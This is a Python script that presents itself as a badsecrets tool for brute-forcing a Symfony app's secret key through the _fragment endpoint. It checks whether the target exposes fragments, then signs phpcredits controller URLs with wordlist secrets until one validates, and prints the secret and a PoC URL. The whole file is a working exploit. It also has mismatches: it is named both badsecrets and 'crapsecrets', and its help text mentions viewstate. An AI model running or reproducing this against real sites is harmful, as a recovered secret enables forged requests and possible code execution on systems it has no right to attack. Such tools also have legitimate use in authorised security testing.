#!/usr/bin/env python3
# badsecrets - Symfony _fragment known secret key brute-force tool
# Black Lantern Security - https://www.blacklanternsecurity.com
# @paulmmueller

import re
import os
import sys
import hashlib
import argparse
import httpx
from contextlib import suppress

SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
sys.path.append(os.path.dirname(SCRIPT_DIR))

from crapsecrets import modules_loaded

Symfony_SignedURL = modules_loaded["symfony_signedurl"]


def validate_url(
    arg_value,
    pattern=re.compile(
        r"^https?://((?:[A-Z0-9_]|[A-Z0-9_][A-Z0-9\-_]*[A-Z0-9_])[\.]?)+(?:[A-Z0-9_][A-Z0-9\-_]*[A-Z0-9_]|[A-Z0-9_])(?::[0-9]{1,5})?.*$",
        re.IGNORECASE,
    ),
):
    if not pattern.match(arg_value):
        raise argparse.ArgumentTypeError("URL is not formatted correctly")
    return arg_value


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument(
        "-u",
        "--url",
        type=validate_url,
        help="The URL of the page to access and attempt to pull viewstate and generator from",
        required=True,
    )

    parser.add_argument(
        "-p",
        "--proxy",
        help="Optionally specify an HTTP proxy",
    )

    parser.add_argument(
        "-a",
        "--user-agent",
        help="Optionally set a custom user-agent",
    )

    args = parser.parse_args()

    if not args.url:
        return

    proxy = None
    if args.proxy:
        if not args.proxy.startswith("http://") and not args.proxy.startswith("https://"):
            proxy = "http://" + args.proxy
        elif args.proxy.startswith("http:") and not args.proxy.startswith("http://"):
            proxy = "http://" + args.proxy[5:]
        elif args.proxy.startswith("https:") and not args.proxy.startswith("https://"):
            proxy = "https://" + args.proxy[6:]
        else:
            proxy = args.proxy

    headers = {}
    if args.user_agent:
        headers["User-agent"] = args.user_agent

    # Remove trailing slash and build URLs
    base_url = args.url.rstrip('/')
    fragment_test_url = f"{base_url}/_fragment"
    negative_test_url = f"{base_url}/AAAAAAAA"

    # Create a single client configured with proxies, headers, and verify set to False.
    with httpx.Client(proxy=proxy, headers=headers, verify=False) as client:
        try:
            res_fragment = client.get(fragment_test_url)
        except (httpx.ConnectError, httpx.ConnectTimeout):
            print(f"Error connecting to URL: [{fragment_test_url}]")
            return

        res_random = client.get(negative_test_url)

        # Check that _fragment returns 403 and differs from the negative URL's status
        if (res_fragment.status_code != 403) or (res_random.status_code == res_fragment.status_code):
            print("Not a Symfony app, or _fragment functionality not enabled...")
            return

        print("Target appears to be a Symfony app with _fragment enabled. Brute forcing Symfony secret...")

        x = Symfony_SignedURL()
        phpinfo_test_url = f"{base_url}/_fragment?_path=_controller%3Dphpcredits"

        # Iterate over potential secrets and try both SHA256 and SHA1
        for l in x.load_resources(["symfony_appsecret.txt"]):
            with suppress(ValueError):
                secret = l.rstrip()
                for hash_algorithm in [hashlib.sha256, hashlib.sha1]:
                    hash_value = x.symfonyHMAC(phpinfo_test_url, secret, hash_algorithm)
                    test_url = f"{phpinfo_test_url}&_hash={hash_value.decode()}"
                    test_res = client.get(test_url)
                    if "PHP Authors" in test_res.text:
                        print(test_url)
                        print(f"Found Symfony Secret! [{secret}]")
                        print(f"PoC URL: {test_url}")
                        print(f"Hash Algorithm: {hash_algorithm.__name__.split('_')[1]}")
                        return

if __name__ == "__main__":
    print("crapsecrets - Symfony _fragment known secret key brute-force tool\n")
    main()
